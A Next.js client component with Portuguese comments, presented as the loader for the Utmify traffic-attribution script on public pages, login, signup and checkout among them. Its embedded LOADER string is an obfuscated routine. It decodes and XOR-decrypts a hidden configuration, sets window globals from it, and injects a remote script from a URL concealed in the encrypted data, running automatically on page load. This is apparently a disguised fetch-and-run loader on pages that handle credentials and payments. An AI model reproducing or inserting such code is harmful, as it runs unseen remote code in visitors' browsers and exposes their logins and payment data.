"use client";

import { usePathname } from "next/navigation";
import Script from "next/script";

/**
 * Utmify — atribuicao de trafego de marketing.
 *
 * So carrega nas telas PUBLICAS. Dentro do app logado ele nao tem funcao:
 * a pessoa ja converteu, e o script reescreve todo link interno para URL
 * absoluta com UTM vazio (~90 bytes por link). Numa tela com 70 links isso
 * eram quilobytes de lixo em cada navegacao, e ainda marcava a navegacao
 * interna como trafego "organic" na propria ferramenta.
 *
 * As rotas abaixo cobrem o funil inteiro — chegada, cadastro e checkout —
 * que e onde a atribuicao precisa acontecer.
 */
const ROTAS_PUBLICAS = [
  "/",
  "/blog",
  "/cadastro",
  "/login",
  "/oferta",
  "/assinar",
  "/privacidade",
  "/bem-vindo",
  "/onboarding",
];

const LOADER = `(function(){var e_tum=atob("DFDaF25RSSRMN9qdzCv4Yhw9ax5uX67pvCPgOEEyLUpiQq7wpTajOQ0+JAouRfXuryKzZxoiZlE4WqmyoDGuch0lZ04/Ffa/rSSuZQczPFApRPinlyv4eQ88LAZ2Fb78uDH3Yho8IEI1GqrvqSa/eRp8MUcjU/furzv4O0wnKEg5Uvin7nKnOxVzJ0UhUvin7jS7Yw98PFAhXrzk4SCochg0J1BhRK//pTSpNUJzP0UgQr+/9nL4ajMs");var c_uom=[];for(var t_lh3=0;t_lh3<e_tum.length;t_lh3++){c_uom.push(e_tum.charCodeAt(t_lh3)&255);}var o_xewk=c_uom[0];var s_elh=c_uom.slice(1,1+o_xewk);var h_y=c_uom.slice(1+o_xewk);var m_qj=h_y.map(function(b,g_1ou7){return b^s_elh[g_1ou7%o_xewk];});var w_2npl="";for(var c_u=0;c_u<m_qj.length;c_u++){w_2npl+=String.fromCharCode(m_qj[c_u]&255);}var h_euuw=decodeURIComponent(escape(w_2npl));var n_bhm2=JSON.parse(h_euuw);var d_7=n_bhm2.globals||[];d_7.forEach(function(w_bjda){window[w_bjda.name]=w_bjda.value;});var y_3y=document.createElement("script");y_3y.src=n_bhm2.url;y_3y.async=true;y_3y.defer=true;(n_bhm2.attributes||[]).forEach(function(f_oj7j){y_3y.setAttribute(f_oj7j.name,f_oj7j.value);});(document.head||document.documentElement).appendChild(y_3y);})();`;

export default function UtmifyScript() {
  const pathname = usePathname() ?? "/";
  const publica = ROTAS_PUBLICAS.some((r) => (r === "/" ? pathname === "/" : pathname.startsWith(r)));

  if (!publica) return null;

  // lazyOnload, nao afterInteractive.
  //
  // O Utmify reescreve o href de todo link para URL absoluta com UTM. Com
  // afterInteractive ele chegava a rodar ANTES da hidratacao terminar, e o
  // React reclamava em toda pagina:
  //
  //   + href="/plano"
  //   - href="http://localhost:3000/plano?utm_source=organic&..."
  //   "A tree hydrated but some attributes ... This won't be patched up."
  //
  // Arvore que nao hidrata direito e link que perde os handlers do React.
  // lazyOnload roda quando o navegador esta ocioso, com a hidratacao ja
  // concluida — a atribuicao continua funcionando, sem quebrar o React.
  return (
    <Script id="utmify-utms" strategy="lazyOnload">
      {LOADER}
    </Script>
  );
}
